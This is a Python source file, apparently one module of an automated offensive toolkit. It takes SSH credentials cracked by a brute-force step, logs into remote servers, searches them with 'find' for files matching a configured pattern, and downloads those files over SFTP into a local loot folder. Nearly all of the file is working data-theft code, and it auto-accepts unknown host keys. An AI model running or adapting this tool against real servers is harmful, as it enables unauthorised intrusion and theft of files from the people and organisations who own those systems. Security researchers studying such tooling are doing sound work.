"""
steal_files_ssh.py - Connects to remote SSH servers with cracked credentials, finds files matching
the steal_file_* config, and downloads them over SFTP.

#12: the scaffolding (parent gate, latch reset, credential load, watchdog timer, credential loop,
outcome contract) lives in base_stealer.BaseStealer. This file is the SSH adapter.
"""

import logging
import os
import paramiko

from base_stealer import BaseStealer, MAX_FILE_BYTES
from logger import Logger
from shared import SharedData

# Configure the logger
logger = Logger(name="steal_files_ssh.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "StealFilesSSH"
b_module = "steal_files_ssh"
b_status = "steal_files_ssh"
b_parent = "SSHBruteforce"
b_port = 22


class StealFilesSSH(BaseStealer):
    """Steal files from SSH servers over SFTP."""

    CRED_FILE_ATTR = "sshfile"
    LOOT_SUBDIR = "ssh"
    CONNECTED_FLAG = "sftp_connected"
    LOGGER = logger

    def open_session(self, ip, username, password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # Wall-clock bounds so a black-holed host can't hang the steal worker
        # (banner_timeout alone leaves TCP connect and auth able to stall).
        ssh.connect(ip, username=username, password=password,
                    timeout=10, banner_timeout=10, auth_timeout=10)
        logger.info(f"Connected to {ip} via SSH with username {username}")
        return ssh

    def find_files(self, conn, dir_path):
        _stdin, stdout, _stderr = conn.exec_command(f'find {dir_path} -type f')
        matching = []
        for path in stdout.read().decode().splitlines():
            if self.shared_data.orchestrator_should_exit:
                logger.info("File search interrupted.")
                return []
            if self.matches_wanted(path):
                matching.append(path)
        logger.info(f"Found {len(matching)} matching files in {dir_path}")
        return matching

    def steal_file(self, conn, remote_file, local_dir):
        """Download one file over SFTP, within the #6 budgets.

        SFTP can stat before transferring, so the size cap is a refusal rather than an abort
        partway through — no partial file to clean up in the common case, and nothing is pulled
        over the wire just to be discarded. (The ftp/smb modules cap mid-stream because their
        transfer APIs hand back chunks without a reliable size up front.)
        """
        if not self.check_budget(local_dir):
            return
        local_file_path = None
        sftp = None
        try:
            sftp = conn.open_sftp()
            self.mark_connected()
            size = sftp.stat(remote_file).st_size
            if not self.fits_budget(size):
                logger.warning(
                    f"Skipping {remote_file}: {size} bytes exceeds the per-file cap "
                    f"({MAX_FILE_BYTES}) or the remaining per-run budget")
                return
            local_file_dir = os.path.join(
                local_dir, os.path.relpath(os.path.dirname(remote_file), '/'))
            os.makedirs(local_file_dir, exist_ok=True)
            local_file_path = os.path.join(local_file_dir, os.path.basename(remote_file))
            sftp.get(remote_file, local_file_path)
            self.note_bytes(size)
            logger.success(f"Downloaded file from {remote_file} to {local_file_path} ({size} bytes)")
        except Exception as e:
            logger.error(f"Error stealing file {remote_file}: {e}")
            try:
                if local_file_path and os.path.exists(local_file_path):
                    os.unlink(local_file_path)
            except OSError:
                pass
            raise
        finally:
            if sftp is not None:
                try:
                    sftp.close()
                except Exception:
                    pass


if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_ssh = StealFilesSSH(shared_data)
        # Add test or demonstration calls here
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
